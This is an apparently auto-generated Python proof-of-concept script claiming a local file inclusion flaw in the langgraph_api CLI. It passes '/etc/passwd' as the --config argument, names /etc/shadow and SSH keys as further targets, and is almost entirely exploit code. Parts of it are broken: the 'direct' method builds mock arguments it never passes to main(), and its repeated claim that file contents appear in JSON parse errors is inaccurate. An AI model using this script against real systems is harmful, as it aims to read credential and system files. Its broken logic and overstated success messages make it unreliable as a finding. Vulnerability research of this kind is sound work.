#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: lfi-002
# Sink: main
# Auto-generated — run with: python3 lfi_config_argument_controllable_cli_main.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langgraph_api CLI
Vulnerability: The --config argument is passed directly to open() without path validation.
Attack: Provide an absolute path or path traversal sequence to read arbitrary files.
"""

import subprocess
import sys
import os
import tempfile
import json

# Configuration
TARGET_FILE = "/etc/passwd"  # Benign file to read (safe default)
# For a more aggressive test, you could use "/etc/shadow" but that requires root

def exploit_lfi():
    """
    Exploit the LFI vulnerability by invoking the CLI with a malicious --config argument.
    The script will attempt to read the specified file and print its contents.
    """
    print(f"[*] Attempting LFI via --config argument")
    print(f"[*] Target file: {TARGET_FILE}")
    
    # We need to find the langgraph_api CLI entry point
    # Try common locations
    possible_clis = [
        "langgraph-api",  # If installed as a package
        os.path.expanduser("~/.local/bin/langgraph-api"),
        os.path.expanduser("~/.local/lib/python3.14/site-packages/langgraph_api/cli.py"),
    ]
    
    cli_path = None
    for path in possible_clis:
        if os.path.exists(path) or subprocess.run(["which", path], capture_output=True).returncode == 0:
            cli_path = path
            break
    
    if not cli_path:
        # Try to find it via pip
        try:
            result = subprocess.run(["pip3", "show", "langgraph-api"], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if line.startswith("Location:"):
                        loc = line.split(": ")[1].strip()
                        cli_path = os.path.join(loc, "langgraph_api", "cli.py")
                        break
        except:
            pass
    
    if not cli_path:
        print("[!] Could not find langgraph-api CLI. Make sure it's installed.")
        print("[!] Try: pip install langgraph-api")
        sys.exit(1)
    
    print(f"[*] Using CLI: {cli_path}")
    
    # Build the command with malicious --config argument
    cmd = [sys.executable, cli_path, "--config", TARGET_FILE]
    
    print(f"[*] Running: {' '.join(cmd)}")
    
    try:
        # Run the command - it will try to parse the file as JSON, but we'll see the error
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        # The file content will appear in the error message when JSON parsing fails
        if result.returncode != 0:
            print(f"[*] Command exited with code {result.returncode}")
            print(f"[*] stderr output (may contain file contents):")
            print(result.stderr[:2000])  # Limit output
            print(f"[*] stdout output:")
            print(result.stdout[:2000])
            
            # Check if we can see the file contents in the error
            if "Expecting value" in result.stderr or "JSON" in result.stderr:
                print("\n[+] SUCCESS: File was read! The error shows the file was opened.")
                print("[+] The file contents appear in the error message above.")
            else:
                print("\n[-] Could not confirm file read. Check output manually.")
        else:
            print("[*] Command succeeded unexpectedly. Check output.")
            print(result.stdout[:2000])
            
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except FileNotFoundError:
        print("[!] Python interpreter not found")
    except Exception as e:
        print(f"[!] Error: {e}")

def exploit_lfi_direct():
    """
    Alternative: Directly call the vulnerable function if we can import it.
    This simulates what happens when the CLI is invoked.
    """
    print("\n[*] Attempting direct exploitation via Python import")
    
    try:
        # Try to import and call the vulnerable function directly
        sys.path.insert(0, os.path.expanduser("~/.local/lib/python3.14/site-packages"))
        from langgraph_api.cli import main
        
        # We need to simulate argparse args
        import argparse
        
        # Create a mock args object
        class MockArgs:
            config = TARGET_FILE
            host = "127.0.0.1"
            port = None
            no_reload = False
            n_jobs_per_worker = None
            open_browser = False
            debug_port = None
            wait_for_client = False
            tunnel = False
            runtime_edition = "inmem"
        
        args = MockArgs()
        
        print(f"[*] Calling main() with config={args.config}")
        print("[*] This will attempt to open the file and parse as JSON")
        print("[*] The file contents will appear in the JSON parse error")
        
        # This will raise an exception when trying to parse the file as JSON
        # But the file was already opened, proving the LFI
        try:
            main()
        except json.JSONDecodeError as e:
            print(f"\n[+] SUCCESS: File was read! JSON parse error confirms file access.")
            print(f"[+] Error: {e}")
            print(f"[+] The file contents are in the error message above.")
        except Exception as e:
            print(f"\n[+] File was likely read. Exception: {e}")
            
    except ImportError as e:
        print(f"[!] Could not import langgraph_api: {e}")
        print("[!] Falling back to CLI invocation method")
        exploit_lfi()
    except Exception as e:
        print(f"[!] Error during direct exploitation: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("LangGraph API LFI Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Try direct exploitation first (more reliable)
    exploit_lfi_direct()
    
    print()
    print("[*] Note: This PoC reads /etc/passwd which is a harmless file.")
    print("[*] An attacker could read any file on the system (e.g., /etc/shadow, SSH keys, etc.)")
    print("[*] To test with a different file, modify TARGET_FILE at the top of this script.")
